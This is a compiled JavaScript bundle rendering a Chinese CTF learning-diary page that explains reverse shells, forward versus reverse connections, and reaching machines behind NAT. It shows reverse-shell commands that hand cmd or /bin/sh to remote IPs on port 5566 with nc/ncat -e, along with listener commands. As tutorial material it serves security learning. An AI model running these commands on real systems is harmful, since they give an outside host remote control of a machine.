(window.webpackJsonp=window.webpackJsonp||[]).push([[188],{708:function(s,a,e){"use strict";e.r(a);var t=e(2),n=Object(t.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("Boxx"),s._v(" "),a("p",[s._v("从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第52天")]),s._v(" "),a("p",[s._v("今日内容：基础入门-反弹SHELL&带外查询&正反向连接&防火墙出入站&文件下载")]),s._v(" "),a("p"),a("div",{staticClass:"table-of-contents"},[a("ul",[a("li",[a("a",{attrs:{href:"#反弹shell"}},[s._v("反弹Shell")]),a("ul",[a("li",[a("a",{attrs:{href:"#反向连接演示"}},[s._v("反向连接演示")])]),a("li",[a("a",{attrs:{href:"#总结"}},[s._v("总结")])]),a("li",[a("a",{attrs:{href:"#反弹shell在内网环境的应用"}},[s._v("反弹Shell在内网环境的应用")])])])])])]),a("p"),s._v(" "),a("ul",[a("li",[s._v("小迪安全视频地址【"),a("RouterLink",{attrs:{to:"/views/numerology/[https://www.bilibili.com/video/BV123yAYMEwb/"}},[s._v("🔗传送门")]),s._v("】")],1)]),s._v(" "),a("h1",{attrs:{id:"第24章-基础入门-反弹shell-带外查询-正反向连接-防火墙出入站-文件下载29-47"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#第24章-基础入门-反弹shell-带外查询-正反向连接-防火墙出入站-文件下载29-47"}},[s._v("#")]),s._v(" 第24章：基础入门-反弹SHELL&带外查询&正反向连接&防火墙出入站&文件下载29-47")]),s._v(" "),a("h2",{attrs:{id:"反弹shell"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#反弹shell"}},[s._v("#")]),s._v(" 反弹Shell")]),s._v(" "),a("h3",{attrs:{id:"反向连接演示"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#反向连接演示"}},[s._v("#")]),s._v(" 反向连接演示")]),s._v(" "),a("p",[a("strong",[s._v("反向连接原理：")])]),s._v(" "),a("ul",[a("li",[s._v("主动给出去，对方监听，区别于正向连接的"),a("code",[s._v("本地监听，等待对方来连")])]),s._v(" "),a("li",[s._v("反向连接是谁监听，就控制对方")])]),s._v(" "),a("p",[a("strong",[s._v("Linux控制Windows：")])]),s._v(" "),a("ol",[a("li",[a("p",[s._v("Windows主动把CMD的权限交给某个IP和端口")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("nc")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-e")]),s._v(" cmd "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("47.94")]),s._v(".236.117 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5566")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])])]),s._v(" "),a("li",[a("p",[s._v("Linux上监听自己的5566端口，等待上钩的鱼，而Windows是主动把钩给Linux")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("ncat "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-lvp")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5566")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])])])]),s._v(" "),a("p",[a("strong",[s._v("Windows控制Linux：")])]),s._v(" "),a("ol",[a("li",[a("p",[s._v("在Windows上监听5566")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("nc")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-lvp")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5566")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])])]),s._v(" "),a("li",[a("p",[s._v("绑定自己的sh，主动给到对方的5566端口（这里"),a("code",[s._v("47.122.23.131 5566")]),s._v("指的是windows的IP和端口）")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("ncat "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-e")]),s._v(" /bin/sh "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("47.122")]),s._v(".23.131 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5566")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])])]),s._v(" "),a("li",[a("p",[s._v("实际上这就是Linux主动把权限给到Windows远程上的5566端口，区别于正向连接的Windows主动控制Linux")])])]),s._v(" "),a("h3",{attrs:{id:"总结"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#总结"}},[s._v("#")]),s._v(" 总结")]),s._v(" "),a("p",[s._v("这其实是一个正反向的问题，还是刚才的图")]),s._v(" "),a("ul",[a("li",[s._v("Linux控制Windows有两种选择，一种是正向连接，一种是反向连接。\n"),a("ol",[a("li",[s._v("正向连接是Linux主动找到Windows，在Windows本地进行监听，Linux连接Windows的本地端口来实现")]),s._v(" "),a("li",[s._v("反向连接是由Windows主动把权限给到Linux，在Linux做本地监听来实现")])])]),s._v(" "),a("li",[s._v("Windows控制Linux也有两种选择，一种是正向连接，一种是反向连接\n"),a("ol",[a("li",[s._v("正向连接是Windows主动找到Linux，在Linux本地进行监听，Windows连接Linux的本地端口来实现")]),s._v(" "),a("li",[s._v("反向连接是由Linux主动把权限给到Windows，在Windows做本地监听来实现")])])])]),s._v(" "),a("h3",{attrs:{id:"反弹shell在内网环境的应用"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#反弹shell在内网环境的应用"}},[s._v("#")]),s._v(" 反弹Shell在内网环境的应用")]),s._v(" "),a("p",[s._v("**了解内网：**类似公司、学校、网吧都是内网环境，他们的组网方式是通过公网IP来上网的。当用户在运营商处办理宽带业务后，运营商通常会提供一个上网账号，用户需将此账号配置到路由器上相应位置，随后，连接至该路由器的各个终端设备，便可依托此账号接入互联网，实现上网功能。")]),s._v(" "),a("p",[s._v("**思考：**如果要控制内部环境的某一台机器，会出现什么问题呢？")]),s._v(" "),a("p",[s._v("这就涉及到外网IP的单个唯一性，就只有一个主网IP，这个IP地址是全球唯一的。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/img/ctfLearn/image-20250110213622805.png",alt:"image-20250110213622805"}})]),s._v(" "),a("p",[s._v("这种情况下只能用反向连接，因为我们自己服务器IP是全球唯一的，但我们正向连接的话，只能找到路由器这一层，找不到下方的哪台机器。")]),s._v(" "),a("p",[s._v("**特殊情况：**如果我们要让路由器知道是我们找的哪台机器，这就需要在路由器设置端口转发/端口映射。")])],1)}),[],!1,null,null,null);a.default=n.exports}}]);